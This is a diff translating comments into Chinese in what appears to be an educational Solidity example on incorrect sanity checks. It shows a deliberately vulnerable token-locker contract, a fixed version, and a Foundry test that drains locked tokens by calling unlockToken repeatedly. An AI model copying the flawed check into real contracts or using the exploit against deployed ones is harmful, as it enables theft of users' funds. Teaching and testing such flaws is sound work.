@@ -48,10 +48,10 @@ contract VulnerableBank {
             "Insufficient token balance"
         );
 
-        // Transfer the tokens to this contract
+        // 将代币转移到该合约中
         IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
 
-        // Create the locker
+        // 创建储物柜
         Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
         locker.hasLockedTokens = true;
         locker.amount = amount;
@@ -63,18 +63,18 @@ contract VulnerableBank {
 
     function unlockToken(uint256 lockerId) public {
         Locker storage locker = _unlockToken[msg.sender][lockerId];
-        // Save the amount to a local variable
+        // 将金额保存到局部变量
         uint256 amount = locker.amount;
         require(locker.hasLockedTokens, "No locked tokens");
 
-        // Incorrect sanity checks.
+        // 健全性检查不正确。
         if (block.timestamp > locker.lockTime) {
             locker.amount = 0;
         }
 
-        // Transfer tokens to the locker owner
-        // This is where the exploit happens, as this can be called multiple times
-        // before the lock time has elapsed.
+        // 将代币转移给储物柜所有者
+         // 这就是漏洞利用发生的地方，因为它可以被多次调用
+         // 在锁定时间过去之前。
         IERC20(locker.tokenAddress).transfer(msg.sender, amount);
     }
 }
@@ -106,10 +106,10 @@ contract FixedeBank {
             "Insufficient token balance"
         );
 
-        // Transfer the tokens to this contract
+        // 将代币转移到该合约中
         IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
 
-        // Create the locker
+        // 创建储物柜
         Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
         locker.hasLockedTokens = true;
         locker.amount = amount;
@@ -124,14 +124,14 @@ contract FixedeBank {
 
         require(locker.hasLockedTokens, "No locked tokens");
         require(block.timestamp > locker.lockTime, "Tokens are still locked"); // Bug fixed
-        // Save the amount to a local variable
+        // 将金额保存到局部变量
         uint256 amount = locker.amount;
 
-        // Mark the tokens as unlocked
+        // 将令牌标记为解锁
         locker.hasLockedTokens = false;
         locker.amount = 0;
 
-        // Transfer tokens to the locker owner
+        //将代币转移给储物柜所有者
         IERC20(locker.tokenAddress).transfer(msg.sender, amount);
     }
 }
@@ -139,47 +139,47 @@ contract FixedeBank {
 
 ***\*测试方法:\****
 
-**仿真测试** --contracts src/test/Incorrect_sanity_checks.sol -vvvv
+**forge test** --contracts src/test/Incorrect_sanity_checks.sol -vvvv
 
 ```
-// Test function to demonstrate a vulnerability in the VulnerableBankContract.
+// 测试函数以演示 VulnerableBankContract 中的漏洞。
 function testVulnerableBank() public {
-    // Log the current timestamp.
+    // 记录当前时间戳。
     console.log("Current timestamp", block.timestamp);
 
-    // Initiate a "prank" with "alice" through the virtual machine (vm).
-    // The specific behavior of the prank function is not evident from the provided code snippet.
+    // 通过虚拟机（vm）向“alice”发起“恶作剧”。
+     // 从提供的代码片段来看，恶作剧函数的具体行为并不明显。
     vm.startPrank(alice);
 
-    // Approve the VulnerableBankContract to spend 10000 tokens from BanksLPContract on behalf of "alice."
+    // 批准 VulnerableBankContract 代表“alice”从 BanksLPContract 花费 10000 个代币。
     BanksLPContract.approve(address(VulnerableBankContract), 10000);
 
-    // Log the balance of BanksLPContract for "alice" before creating the locker.
+    // 在创建储物柜之前记录“alice”的 BanksLPContract 余额。
     console.log(
         "Before locking, my BanksLP balance",
         BanksLPContract.balanceOf(address(alice))
     );
 
-    // Create a locker for 10000 tokens in the VulnerableBankContract, with a lock duration of 86400 seconds (1 day).
+    // 在VulnerableBankContract中创建10000个代币的储物柜，锁定时长为86400秒（1天）。
     VulnerableBankContract.createLocker(
         address(BanksLPContract),
         10000,
         86400
     );
 
-    // Log the balance of BanksLPContract for "alice" before exploiting the locker.
+    // 在利用储物柜之前记录“alice”的 BanksLPContract 余额。
     console.log(
         "Before exploiting, my BanksLP balance",
         BanksLPContract.balanceOf(address(alice))
     );
 
-    // Exploit the locker in VulnerableBankContract by calling the 'unlockToken' function 10 times.
-    // The exact vulnerability being exploited is not evident from the provided code snippet.
+    // 通过调用 'unlockToken' 函数 10 次来利用 VulnerableBankContract 中的锁柜。
+     // 从提供的代码片段来看，所利用的确切漏洞并不明显。
     for (uint i = 0; i < 10; i++) {
         VulnerableBankContract.unlockToken(1);
     }
 
-    // Log the balance of BanksLPContract for "alice" after exploiting the locker.
+    // 利用储物柜后记录“alice”的 BanksLPContract 余额。
     console.log(
         "After exploiting, my BanksLP balance",
         BanksLPContract.balanceOf(address(alice))
